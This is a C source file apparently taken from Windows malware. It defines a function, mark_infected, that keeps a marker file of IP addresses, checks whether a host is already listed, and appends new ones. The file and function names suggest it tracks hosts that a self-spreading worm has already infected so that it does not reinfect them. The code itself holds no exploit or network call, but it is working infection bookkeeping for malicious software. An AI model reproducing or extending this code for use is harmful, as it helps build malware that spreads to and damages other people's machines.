#include <windows.h>
#include <string.h>
#include "config.h"

int mark_infected(const char *ip)
{
    HANDLE file;
    size_t ip_len;
    unsigned char buffer[8192];
    DWORD bytes_read;
    size_t line_len = 0;
    int line_matches = 1;
    int pending_cr = 0;
    int have_byte = 0;
    unsigned char last_byte = 0;
    int found = 0;
    LARGE_INTEGER zero;
    LARGE_INTEGER end;

    if (ip == NULL || ip[0] == '\0')
        return -1;

    ip_len = strlen(ip);
    file = CreateFileA(SELF_MARKER, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return -1;

    for (;;) {
        DWORD i;

        if (!ReadFile(file, buffer, (DWORD)sizeof(buffer), &bytes_read, NULL)) {
            CloseHandle(file);
            return -1;
        }
        if (bytes_read == 0)
            break;

        for (i = 0; i < bytes_read; ++i) {
            unsigned char c = buffer[i];

            have_byte = 1;
            last_byte = c;

            if (c == '\n') {
                pending_cr = 0;
                if (line_matches && line_len == ip_len) {
                    found = 1;
                    break;
                }
                line_len = 0;
                line_matches = 1;
            } else {
                if (pending_cr) {
                    if (line_len < ip_len) {
                        if ((unsigned char)ip[line_len] != '\r')
                            line_matches = 0;
                        ++line_len;
                    } else {
                        line_matches = 0;
                    }
                    pending_cr = 0;
                }

                if (c == '\r') {
                    pending_cr = 1;
                } else if (line_len < ip_len) {
                    if ((unsigned char)ip[line_len] != c)
                        line_matches = 0;
                    ++line_len;
                } else {
                    line_matches = 0;
                }
            }
        }

        if (found)
            break;
    }

    if (found) {
        CloseHandle(file);
        return 1;
    }

    if (pending_cr) {
        if (line_len < ip_len) {
            if ((unsigned char)ip[line_len] != '\r')
                line_matches = 0;
            ++line_len;
        } else {
            line_matches = 0;
        }
    }

    if (line_matches && line_len == ip_len) {
        CloseHandle(file);
        return 1;
    }

    zero.QuadPart = 0;
    if (!SetFilePointerEx(file, zero, &end, FILE_END)) {
        CloseHandle(file);
        return -1;
    }

    if (have_byte && last_byte != '\n') {
        unsigned char newline = '\n';
        DWORD written;

        if (!WriteFile(file, &newline, 1, &written, NULL) || written != 1) {
            CloseHandle(file);
            return -1;
        }
    }

    {
        const unsigned char *p = (const unsigned char *)ip;
        size_t remaining = ip_len;

        while (remaining != 0) {
            DWORD chunk = remaining > (size_t)MAXDWORD
                              ? MAXDWORD
                              : (DWORD)remaining;
            DWORD written;

            if (!WriteFile(file, p, chunk, &written, NULL) || written == 0) {
                CloseHandle(file);
                return -1;
            }
            p += written;
            remaining -= written;
        }
    }

    {
        unsigned char newline = '\n';
        DWORD written;

        if (!WriteFile(file, &newline, 1, &written, NULL) || written != 1) {
            CloseHandle(file);
            return -1;
        }
    }

    if (!CloseHandle(file))
        return -1;

    return 0;
}